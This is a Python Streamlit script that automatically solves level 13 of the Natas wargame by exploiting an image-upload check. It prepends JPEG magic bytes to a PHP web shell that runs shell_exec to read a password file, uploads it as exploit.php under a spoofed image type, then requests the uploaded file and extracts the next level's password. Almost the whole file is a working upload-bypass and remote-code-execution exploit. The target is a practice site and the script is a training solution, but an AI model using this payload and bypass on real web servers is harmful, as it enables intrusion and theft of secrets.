import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting image verification verification bypass via magic byte manipulation...")
    
    # 1. Prepend standard JPEG magic bytes (\xFF\xD8\xFF\xE0) to bypass exif_imagetype()
    # This creates a polyglot payload structure
    magic_bytes = b"\xFF\xD8\xFF\xE0"
    php_code = b"<?php echo shell_exec('cat /etc/natas_webpass/natas14'); ?>"
    polyglot_payload = magic_bytes + php_code
    
    # 2. Setup multipart request targets
    files = {
        'uploadedfile': ('exploit.php', polyglot_payload, 'image/jpeg')
    }
    data = {
        'filename': 'exploit.php',
        'submit': 'Upload File'
    }
    
    try:
        st.write("📤 Transmitting image-masked multi-part payload script structure...")
        response = session.post(base_url, files=files, data=data, timeout=10)
        
        if response.status_code == 200:
            # 3. Parse destination paths
            match = re.search(r'The file <a href="([^"]+)">', response.text)
            
            if match:
                relative_uploaded_path = match.group(1)
                execution_url = f"{base_url}/{relative_uploaded_path}"
                st.success("🔓 Bypassed type validation checks successfully!")
                st.write(f"Target path: `{execution_url}`")
                
                # 4. Trigger target path endpoint
                st.write("🔄 Requesting the payload URL to extract token context...")
                execution_response = session.get(execution_url, timeout=10)
                output_text = execution_response.text.strip()
                
                # 5. Isolate character sequence
                token_match = re.search(r'[A-Za-z0-9]{32}', output_text)
                
                if token_match:
                    st.success("🎯 Level 13 challenge solved successfully!")
                    st.code(f"Natas 14 Password: {token_match.group(0)}")
                else:
                    st.warning("The asset wrapper resolved but no valid 32-character pattern was extracted.")
                    with st.expander("View Raw Output Context"):
                        st.code(output_text)
            else:
                st.error("Failed to target the destination folder link string within page boundaries.")
                with st.expander("View Response Source Summary"):
                    st.code(response.text, language="html")
        else:
            st.error(f"The upload configuration framework was rejected. Status Code: {response.status_code}")
            
    except Exception as e:
        st.error(f"Module execution architecture failed: {str(e)}")